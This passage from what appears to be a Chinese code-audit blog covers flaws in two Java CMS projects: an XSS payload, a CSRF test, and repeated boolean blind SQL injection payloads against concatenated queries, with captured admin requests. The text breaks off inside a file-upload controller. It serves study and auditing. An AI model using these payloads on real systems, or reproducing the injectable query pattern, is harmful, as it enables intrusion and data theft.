class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequiresPermissions(&quot;core:homepage:mail_inbox:list&quot;)</span></span><br><span class="line"><span class="meta">@RequestMapping(value = &quot;mail_inbox_list.do&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">mailInboxList</span><span class="params">(<span class="meta">@RequestParam(defaultValue = &quot;false&quot;)</span> <span class="type">boolean</span> unread,</span></span><br><span class="line"><span class="params"><span class="meta">@PageableDefault(sort = &quot;receiveTime&quot;, direction = Direction.DESC)</span> Pageable pageable,</span></span><br><span class="line"><span class="params">HttpServletRequest request, org.springframework.ui.Model modelMap)</span> &#123;</span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> Context.getCurrentUser();</span><br><span class="line">Map&lt;String, String[]&gt; params = Servlets.getParamValuesMap(request, Constants.SEARCH_PREFIX);</span><br><span class="line">Page&lt;MailInbox&gt; pagedList = inboxService.findAll(user.getId(), params, pageable);</span><br><span class="line">modelMap.addAttribute(<span class="string">&quot;pagedList&quot;</span>, pagedList);</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;core/homepage/mail_inbox_list&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​这个控制器的大致逻辑是先检测用户的权限，然后从请求体中获取传参，然后传入findALL进行查找，返回分页后的结果，然后再把结果渲染进模板中最后返回到前端。可见这里并没有对XSS进行过滤或者拦截，我们定位到前端的系统消息-列表的搜索功能点。</p><p>​URL如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.21.87.148:8888/cmscp/core/homepage/mail_inbox_list.do?search_CONTAIN_mailText.subject=test</span><br></pre></td></tr></table></figure><p>​我们开始构造XSSpayload：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;img%20src=x onerror=alert(&#x27;xss&#x27;)&gt;&lt;</span><br></pre></td></tr></table></figure><p>​访问一下：</p><p><img src="/img/cs_singlewindow_cms/image-20241210194803752.png" alt="image-20241210194803752"></p><p>​其余的搜索框也是一样的漏洞。</p><h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>​我们来到TAG管理这里，新建一个TAG，抓包。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cmscp/core/tag/save.do</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.21.87.148:8888</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>52</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://172.21.87.148:8888</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://172.21.87.148:8888/cmscp/core/tag/create.do?</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>_site=1; JSESSIONID=FE1E77A0FA48CA0F95810E8740DBB51E</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-dts"><span class="attr">oid</span><span class="operator">=</span><span class="variable">&amp;position</span>=<span class="variable">&amp;redirect</span>=edit<span class="variable">&amp;name</span>=CSRF<span class="variable">&amp;</span>creationD<span class="attr">ate</span><span class="operator">=</span></span></span><br></pre></td></tr></table></figure><p>​创建CSRF的POC然后模拟管理员访问该链接。</p><p><img src="/img/cs_singlewindow_cms/image-20241210195356700.png" alt="image-20241210195356700"></p><p>​成功。<br>   至此该项目审计结束。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Code Audit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JFinalCMS</title>
      <link href="/2024/12/03/JFinalCMS/"/>
      <url>/2024/12/03/JFinalCMS/</url>
      
        <content type="html"><![CDATA[<h2 id="项目技术栈"><a href="#项目技术栈" class="headerlink" title="项目技术栈"></a>项目技术栈</h2><h4 id="软件架构"><a href="#软件架构" class="headerlink" title="软件架构"></a>软件架构</h4><ol><li>MVC:JFinal</li><li>页面:enjoy</li><li>缓存:ehcache</li><li>数据库:Mysql</li></ol><h2 id="项目依赖审计"><a href="#项目依赖审计" class="headerlink" title="项目依赖审计"></a>项目依赖审计</h2><p>​引入依赖无已披露漏洞</p><h2 id="单点漏洞审计"><a href="#单点漏洞审计" class="headerlink" title="单点漏洞审计"></a>单点漏洞审计</h2><h3 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h3><h4 id="src-main-java-com-cms-entity-Content-java（成功）"><a href="#src-main-java-com-cms-entity-Content-java（成功）" class="headerlink" title="src\main\java\com\cms\entity\Content.java（成功）"></a>src\main\java\com\cms\entity\Content.java（成功）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Page&lt;Content&gt; <span class="title function_">findPage</span><span class="params">(Long categoryId,Boolean isEnabled,String title,Integer pageNumber,Integer pageSize)</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">filterSql</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(categoryId!=<span class="literal">null</span>)&#123;</span><br><span class="line">    filterSql+=<span class="string">&quot; and (categoryId=&quot;</span>+categoryId+<span class="string">&quot; or categoryId in ( select id from kf_category where treePath  like &#x27;%&quot;</span>+Category.TREE_PATH_SEPARATOR+categoryId+Category.TREE_PATH_SEPARATOR+<span class="string">&quot;%&#x27;))&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(isEnabled!=<span class="literal">null</span>)&#123;</span><br><span class="line">    filterSql+= <span class="string">&quot; and isEnabled=&quot;</span>+isEnabled;</span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">if</span>(StringUtils.isNotBlank(title))&#123;</span><br><span class="line">            filterSql+= <span class="string">&quot; and title like &#x27;%&quot;</span>+title+<span class="string">&quot;%&#x27;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="type">String</span> <span class="variable">orderBySql</span> <span class="operator">=</span> DBUtils.getOrderBySql(<span class="string">&quot;createDate desc&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> paginate(pageNumber, pageSize, <span class="string">&quot;select *&quot;</span>, <span class="string">&quot;from kf_content where 1=1 &quot;</span>+filterSql+orderBySql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​我们发现在title处使用了动态拼接，向上定位发现了有两个控制器直接调用了这个语句，分别在</p><p>src&#x2F;main&#x2F;java&#x2F;com&#x2F;cms&#x2F;controller&#x2F;front&#x2F;CategoryController.java</p><p>src&#x2F;main&#x2F;java&#x2F;com&#x2F;cms&#x2F;controller&#x2F;admin&#x2F;ContentController.java</p><p>​这两个一个是在管理员后台的内容管理模块，一个是在前端的类型检索。后者危害显然更大，但是我们发现这里调用为静态调用，这里固定传参title为null。事实上，除去后端内容的控制器，其余所有的调用title都固定为null。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setAttr(<span class="string">&quot;page&quot;</span>, <span class="keyword">new</span> <span class="title class_">Content</span>().dao().findPage(categoryId, <span class="literal">true</span>,<span class="literal">null</span>,pageNumber,pageSize));</span><br></pre></td></tr></table></figure><p>​所以这里无法利用，那么我们就转到管理员后台的内容管理模块去测试。</p><p><img src="/img/JFinalCMS/image-20241202104210107-1733226899924-1.png" alt="image-20241202104210107"></p><p>​来到后台，根据title变量名，我们定位到标题查询的功能点，抓包。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/admin/content/list?categoryId=1&amp;title=test&amp;pageSize=20&amp;totalPage=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.23.192.1:8888</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://172.23.192.1:8888/admin/content/list?categoryId=1</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>listQuery=%3FcategoryId%3D1; JSESSIONID=3C134A3BD7FF93C76A3E668F0946D633</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p>​其中GET参数中的title变量就是我们的注入点，我们输入单引号报错,使用sleep验证是否可执行函数，发现可执行函数，构造payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and ascii(substr(database(),1,1))=1#</span></span><br></pre></td></tr></table></figure><p>​使用BP爆破，进行SQL盲注</p><p><img src="/img/JFinalCMS/image-20241202144633949-1733226899925-2.png" alt="image-20241202144633949"></p><p>​使用脚本处理数锯得到库名：</p><p><img src="/img/JFinalCMS/image-20241202144839069-1733226899925-3.png" alt="image-20241202144839069"></p><h4 id="src-main-java-com-cms-entity-ContentModel-java（成功）"><a href="#src-main-java-com-cms-entity-ContentModel-java（成功）" class="headerlink" title="src\main\java\com\cms\entity\ContentModel.java（成功）"></a>src\main\java\com\cms\entity\ContentModel.java（成功）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Page&lt;ContentModel&gt; <span class="title function_">findPage</span><span class="params">(String name,Integer pageNumber,Integer pageSize)</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">filterSql</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(StringUtils.isNotBlank(name))&#123;</span><br><span class="line">            filterSql+= <span class="string">&quot; and name like &#x27;%&quot;</span>+name+<span class="string">&quot;%&#x27;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">orderBySql</span> <span class="operator">=</span> DBUtils.getOrderBySql(<span class="string">&quot;createDate desc&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> paginate(pageNumber, pageSize, <span class="string">&quot;select *&quot;</span>, <span class="string">&quot;from kf_content_model where 1=1 &quot;</span>+filterSql+orderBySql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​向上追溯，发现被内容模型管理的list控制器直接调用，我们定位到前端的管理员内容管理模型管理，定位到查询功能点</p><p><img src="/img/JFinalCMS/image-20241202145718689-1733226899925-4.png" alt="image-20241202145718689"></p><p>​查询后抓包，抓得如下数据包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/admin/content_model/list?name=test&amp;pageSize=20&amp;totalPage=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.23.192.1:8888</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://172.23.192.1:8888/admin/content_model/list</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=9D962EC77EDD63508C413E78024A69B1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p>​其中GET传参中的name参数为注入点，输入单引号报错，输入注释符后正常，尝试sleep函数是否可执行判断是否可执行函数，发现可执行sleep函数，构造payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and ascii(substr(database(),1,1))=1#</span></span><br></pre></td></tr></table></figure><p>​使用BP爆破</p><p><img src="/img/JFinalCMS/image-20241202150219419-1733226899925-5.png" alt="image-20241202150219419"></p><p>​处理数据后，得到库名：</p><p><img src="/img/JFinalCMS/image-20241202150256796-1733226899925-6.png" alt="image-20241202150256796"></p><h4 id="src-main-java-com-cms-entity-Ad-java（成功）"><a href="#src-main-java-com-cms-entity-Ad-java（成功）" class="headerlink" title="src\main\java\com\cms\entity\Ad.java（成功）"></a>src\main\java\com\cms\entity\Ad.java（成功）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Page&lt;Ad&gt; <span class="title function_">findPage</span><span class="params">(String title,Integer pageNumber,Integer pageSize)</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">filterSql</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(StringUtils.isNotBlank(title))&#123;</span><br><span class="line">            filterSql+= <span class="string">&quot; and title like &#x27;%&quot;</span>+title+<span class="string">&quot;%&#x27;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="type">String</span> <span class="variable">orderBySql</span> <span class="operator">=</span> DBUtils.getOrderBySql(<span class="string">&quot;createDate desc&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> paginate(pageNumber, pageSize, <span class="string">&quot;select *&quot;</span>, <span class="string">&quot;from kf_ad where 1=1 &quot;</span>+filterSql+orderBySql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​向上追溯，发现改语句被广告模块的list方法调用了，我们定位到前端广告模块的查询功能</p><p><img src="/img/JFinalCMS/image-20241202150756049-1733226899925-7.png" alt="image-20241202150756049"></p><p>​查询后抓包的到如下数据包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/admin/ad/list?title=test&amp;pageSize=20&amp;totalPage=0</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.23.192.1:8888</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://172.23.192.1:8888/admin/ad/list</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=9D962EC77EDD63508C413E78024A69B1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p>​其中GET参数中的title就是注入点。</p><p>​输入单引号报错，注释后恢复正常，测试sleep函数是否可用判断是否可执行函数，发现sleep可用，构造payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and ascii(substr(database(),1,1))=1#</span></span><br></pre></td></tr></table></figure><p>​使用BP爆破：</p><p><img src="/img/JFinalCMS/image-20241202151813365-1733226899925-9.png" alt="image-20241202151813365"></p><p>​处理数据，得到库名：</p><p><img src="/img/JFinalCMS/image-20241202151851427-1733226899925-8.png" alt="image-20241202151851427"></p><h4 id="src-main-java-com-cms-entity-AdPosition-java（成功）"><a href="#src-main-java-com-cms-entity-AdPosition-java（成功）" class="headerlink" title="src\main\java\com\cms\entity\AdPosition.java（成功）"></a>src\main\java\com\cms\entity\AdPosition.java（成功）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Page&lt;AdPosition&gt; <span class="title function_">findPage</span><span class="params">(String name,Integer pageNumber,Integer pageSize)</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">filterSql</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(StringUtils.isNotBlank(name))&#123;</span><br><span class="line">            filterSql+= <span class="string">&quot; and name like &#x27;%&quot;</span>+name+<span class="string">&quot;%&#x27;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">orderBySql</span> <span class="operator">=</span> DBUtils.getOrderBySql(<span class="string">&quot;createDate desc&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> paginate(pageNumber, pageSize, <span class="string">&quot;select *&quot;</span>, <span class="string">&quot;from kf_ad_position where 1=1 &quot;</span>+filterSql+orderBySql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​向上追溯，定位到广告位的list控制器，前往前端的广告位控制器。</p><p><img src="/img/JFinalCMS/image-20241202152458404-1733226899925-11.png" alt="image-20241202152458404"></p><p>​抓包，得到如下数据包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/admin/ad_position/list?name=test&amp;pageSize=20&amp;totalPage=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.23.192.1:8888</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://172.23.192.1:8888/admin/ad_position/list</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=9D962EC77EDD63508C413E78024A69B1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p>​其中GET参数中的name参数为注入点。</p><p>​输入单引号报错，输入注释符变为正常，测试sleep函数判断是否可执行函数，发现函数可执行，构造payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and ascii(substr(database(),1,1))=1#</span></span><br></pre></td></tr></table></figure><p>​使用BP爆破：</p><p><img src="/img/JFinalCMS/image-20241202152737693-1733226899925-12.png" alt="image-20241202152737693"></p><p>​处理数据，得到库名：</p><p><img src="/img/JFinalCMS/image-20241202152802353-1733226899925-10.png" alt="image-20241202152802353"></p><h4 id="src-main-java-com-cms-entity-Tag-java（成功）"><a href="#src-main-java-com-cms-entity-Tag-java（成功）" class="headerlink" title="src\main\java\com\cms\entity\Tag.java（成功）"></a>src\main\java\com\cms\entity\Tag.java（成功）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Page&lt;Tag&gt; <span class="title function_">findPage</span><span class="params">(String name,Integer pageNumber,Integer pageSize)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">filterSql</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(StringUtils.isNotBlank(name))&#123;</span><br><span class="line">            filterSql+= <span class="string">&quot; and name like &#x27;%&quot;</span>+name+<span class="string">&quot;%&#x27;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">orderBySql</span> <span class="operator">=</span> DBUtils.getOrderBySql(<span class="string">&quot;createDate desc&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> paginate(pageNumber, pageSize, <span class="string">&quot;select *&quot;</span>, <span class="string">&quot;from kf_tag where 1=1 &quot;</span>+filterSql+orderBySql);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>​向上追溯，根据路由定位到前端的标签管理的查询功能</p><p>​<img src="/img/JFinalCMS/image-20241203122034629.png" alt="image-20241203122034629"></p><p>​查询，抓包，抓得如下数据包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/admin/tag/list?name=test&amp;pageSize=20&amp;totalPage=0</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.21.127.205:8888</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://172.21.127.205:8888/admin/tag/list</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=2DE50A32542B4705A70D6CC4FDD343BC</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p>​其中的name为注入点，输入单引号报错，注释后恢复正常。测试sleep 函数判断是否可执行函数，成功执行函数，构造payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and ascii(substr(database(),1,1))=1#</span></span><br></pre></td></tr></table></figure><p><img src="/img/JFinalCMS/image-20241203122501296.png" alt="image-20241203122501296"></p><p>​得到库名：</p><p><img src="/img/JFinalCMS/image-20241203122634716.png" alt="image-20241203122634716"></p><p>​该项目几乎所有的查询功能使用的都是动态拼接，payload也都是相同的payload，因此不再详细写出，仅列出部分文件的位置。</p><p>src\main\java\com\cms\entity\AdPosition.java</p><p>src\main\java\com\cms\entity\Role.java</p><p>src\main\java\com\cms\entity\FriendLink.java</p><h3 id="任意文件控制（上传、读取等）"><a href="#任意文件控制（上传、读取等）" class="headerlink" title="任意文件控制（上传、读取等）"></a>任意文件控制（上传、读取等）</h3><p>​我们搜索upload，定位到文件上传的控制器</p><h4 id="src-main-java-com-cms-controller-admin-FileController-java"><a href="#src-main-java-com-cms-controller-admin-FileController-java" class="headerlink" title="src\main\java\com\cms\controller\admin\FileController.java"></a>src\main\java\com\cms\controller\admin\FileController.java</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">upload</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">UploadFile</span> <span class="variable">uploadFile</span> <span class="operator">=</span> getFile();</span><br><span class="line"><span class="type">String</span> <span class="variable">fileType</span> <span class="operator">=</span> getPara(<span class="string">&quot;fileType&quot;</span>);</span><br><span class="line">Map&lt;String, Object&gt; data = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line"><span class="keyword">if</span> (fileType == <span class="literal">null</span> || uploadFile == <span class="literal">null</span> || uploadFile.getFile().length()==<span class="number">0</span>) &#123;</span><br><span 